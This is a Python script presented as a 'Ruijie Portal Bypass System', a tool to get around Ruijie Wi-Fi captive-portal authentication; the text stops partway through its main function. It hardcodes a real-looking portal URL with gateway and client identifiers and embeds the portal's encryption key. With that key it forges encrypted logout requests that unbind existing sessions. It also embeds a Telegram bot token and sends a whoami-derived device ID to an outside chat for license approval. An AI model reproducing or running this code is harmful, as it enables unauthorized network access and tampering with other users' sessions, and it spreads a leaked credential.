import getpass
import os
import re
import sys
import time
import ping3
import base64
import random
import string
import aiohttp
import asyncio
import hashlib
import requests
import subprocess
from datetime import timedelta, datetime
from urllib.parse import unquote, urlparse, parse_qs
from Crypto.Util.Padding import pad
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

# ===== Colors =====
r, g, y, b, w, c = "\033[1;31m", "\033[1;32m", "\033[1;33m", "\033[1;34m", "\033[0m", "\033[1;36m"

# ===== Telegram Config =====
TELEGRAM_BOT_TOKEN = "8801899210:AAG7tA3K0z847-DwOQC0M_goARef0rKmL"
TELEGRAM_CHAT_ID = "1901101365"

# ===== Target URL =====
TARGET_URL = "https://portal-as.ruijienetworks.com/api/auth/wifidog?stage=portal&gw_id=4c49684b2d2e&gw_sn=H1U82VB006839&gw_address=192.168.110.1&gw_port=2060&ip=192.168.110.180&mac=ea:4b:cc:49:db:bd&slot_num=16&nasip=192.168.1.63&ssid=VLAN233&ustate=0&mac_req=1&url=http%3A%2F%2F192.168.0.1%2F&chap_id=%5C311&chap_challenge=%5C251%5C002%5C152%5C160%5C153%5C313%5C221%5C035%5C277%5C321%5C256%5C070%5C153%5C351%5C231%5C142"

LOG_FILE = "bypass_history.txt"
LICENSE_FILE = ".license"

# ===== Utility =====
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def Line():
    try:
        columns = os.get_terminal_size().columns
    except OSError:
        columns = 80
    print(f"{y}─{w}" * columns)

def get_device_id():
    id_file = ".device_id"
    if os.path.exists(id_file):
        try:
            with open(id_file, "r") as f:
                return f.read().strip()
        except:
            pass
    try:
        result = subprocess.check_output("whoami", shell=True, encoding='utf-8')
        device_id = result.strip()
        if device_id:
            clean_id = re.sub(r'[^A-Za-z0-9]', '', device_id).upper()
            clean_id = (clean_id[:6] if len(clean_id) >= 6 else clean_id.ljust(6, 'X'))
            new_id = f"STR-{clean_id}"
            with open(id_file, "w") as f:
                f.write(new_id)
            return new_id
    except:
        pass
    try:
        device_id = getpass.getuser()
        if device_id:
            clean_id = re.sub(r'[^A-Za-z0-9]', '', device_id).upper()
            clean_id = clean_id[:6].ljust(6, 'X')
            new_id = f"STR-{clean_id}"
            with open(id_file, "w") as f:
                f.write(new_id)
            return new_id
    except:
        pass
    random_id = "STR-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
    with open(id_file, "w") as f:
        f.write(random_id)
    return random_id

def write_log(message):
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log_entry = f"[{timestamp}] {message}\n"
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(log_entry)

def format_remaining(remaining):
    if remaining is None:
        return "Unknown"
    days = remaining.days
    hours = remaining.seconds // 3600
    minutes = (remaining.seconds % 3600) // 60
    if days > 0:
        return f"{days}d {hours}h"
    elif hours > 0:
        return f"{hours}h {minutes}m"
    else:
        return f"{minutes}m"

# ===== License Manager =====
def get_license_status():
    if not os.path.exists(LICENSE_FILE):
        return None, None, None, None
    try:
        with open(LICENSE_FILE, "r") as f:
            data = f.read().strip().split("|")
            if len(data) != 2:
                return None, None, None, None
            key, exp_ts = data
            exp_dt = datetime.fromtimestamp(float(exp_ts))
            now = datetime.now()
            if now < exp_dt:
                return True, key, exp_dt, exp_dt - now
            else:
                return False, key, exp_dt, None
    except:
        return None, None, None, None

def save_license(key, days):
    exp_dt = datetime.now() + timedelta(days=days)
    with open(LICENSE_FILE, "w") as f:
        f.write(f"{key}|{exp_dt.timestamp()}")
    return exp_dt

def send_telegram_message(text):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": text}
    try:
        requests.post(url, json=payload, timeout=5)
    except:
        pass

def get_updates(offset=None):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
    params = {"timeout": 10, "offset": offset} if offset else {"timeout": 10}
    try:
        resp = requests.get(url, params=params, timeout=12)
        if resp.status_code == 200:
            return resp.json().get("result", [])
    except:
        pass
    return []

def request_license_via_telegram(user_key):
    device_id = get_device_id()
    msg = f"🔑 *License Request*\n📱 Device: `{device_id}`\n🔑 Key: `{user_key}`\n\nReply: `/allow {user_key} <days>`"
    send_telegram_message(msg)
    print(f"{c}[*] Request sent to Telegram. Waiting for admin approval...{w}")
    
    last_update_id = None
    timeout = 120
    start = time.time()
    while time.time() - start < timeout:
        updates = get_updates(offset=last_update_id)
        for update in updates:
            last_update_id = update.get("update_id") + 1
            msg_obj = update.get("message")
            if msg_obj and str(msg_obj.get("chat", {}).get("id")) == TELEGRAM_CHAT_ID:
                text = msg_obj.get("text", "").strip()
                match = re.match(rf"^/allow\s+{re.escape(user_key)}\s+(\d+)$", text, re.I)
                if match:
                    days = int(match.group(1))
                    if days <= 0:
                        send_telegram_message(f"❌ Invalid days for {user_key}")
                        continue
                    exp_dt = save_license(user_key, days)
                    send_telegram_message(f"✅ License granted for `{user_key}`. Expires: {exp_dt.strftime('%Y-%m-%d')}")
                    return True
                else:
                    if text.lower().startswith("/deny") and user_key in text:
                        send_telegram_message(f"❌ License denied for {user_key}")
                        return False
        time.sleep(2)
    send_telegram_message(f"⏳ Timeout for {user_key}")
    return False

# ===== WifiSetup =====
class WifiSetup:
    def __init__(self, gw_address, chap_id, chap_challenge):
        self.baseurl = f"http://{gw_address}:2060"
        self.username_get_url = self.baseurl + "/username_get"
        self.online_info_url = self.baseurl + "/user/online_info"
        self.logout_url = self.baseurl + "/user/logout"
        self.enc_key = "RjYkhwzx$2018!"
        self.chap_id = chap_id
        self.chap_challenge = chap_challenge

    def start_setup(self):
        print(f"\n{c}[*] Starting Ruijie Wi-Fi Setup...{w}")
        status = self.unbind()
        Line()
        if not status:
            print(f"{y}[!] Unbind old session failed!{w}")
            write_log("Wi-Fi Setup - unbind failed")
        else:
            print(f"{g}[+] Old session unbound successfully!{w}")
            write_log("Wi-Fi Setup - unbind success")
        time.sleep(1)

    def unbind(self):
        username = self.username_get()
        if not username: return False
        online_info = self.get_online_info(username)
        if not online_info: return False
        data = self.arrange_data(online_info)
        return self.logout(data, username)

    def username_get(self):
        try: return requests.get(self.username_get_url, timeout=5).json().get("username", None)
        except: return None

    def get_online_info(self, username):
        params = {"username": username, "usertype": "wifidog"}
        try: return requests.get(self.online_info_url, params=params, timeout=5).json()["data"]["list"][0]
        except: return None

    def arrange_data(self, info):
        repmac = info["mac"].replace(":", "")
        repmac = [repmac[i:i+4] for i in range(0, len(repmac), 4)]
        return {"ip": info["ip"], "mac": info["mac"], "ip_req": info["ip"], "mac_req": ".".join(repmac)}

    def encrypt_cryptojs(self, auth, enc_key):
        """ ပြတ်တောက်နေသော AES-256-CBC CryptoJS Encryption စနစ်အား ဖြည့်စွက်ပြင်ဆင်ထားခြင်း """
        try:
            salt = get_random_bytes(8)
            key_iv = b''
            prev = b''
            while len(key_iv) < 48:
                prev = hashlib.md5(prev + enc_key.encode("utf-8") + salt).digest()
                key_iv += prev
            
            key = key_iv[:32]
            iv = key_iv[32:48]
            
            cipher = AES.new(key, AES.MODE_CBC, iv)
            padded_data = pad(auth.encode('utf-8'), AES.block_size)
            encrypted = cipher.encrypt(padded_data)
            
            result = b'Salted__' + salt + encrypted
            return base64.b64encode(result).decode('utf-8')
        except Exception as e:
            print(f"{r}[!] Encryption failed: {e}{w}")
            return None

    def logout(self, data, username):
        try:
            auth_str = f"username={username}&ip={data['ip']}&mac={data['mac']}"
            enc_data = self.encrypt_cryptojs(auth_str, self.enc_key)
            if not enc_data: return False
            
            payload = {"data": enc_data}
            res = requests.post(self.logout_url, json=payload, timeout=5)
            if res.status_code == 200 and "success" in res.text.lower():
                return True
        except:
            pass
        return False

# ===== Main Execution Linker =====
def main():
    clear()
    print(f"{b}========================================={w}")
    print(f"{g}      Ruijie Portal Bypass System        {w}")
    print(f"{b}========================================={w}")
    
    # License စစ်ဆေးခြင်း
    status, key, exp_dt, remaining = get_license_status()
    device_id = get_device_id()
    print(f"{c}[*] Device ID: {device_id}{w}")
    
    if status is None or status is False:
        print(f"{r}[!] No valid license found or key expired.{w}")
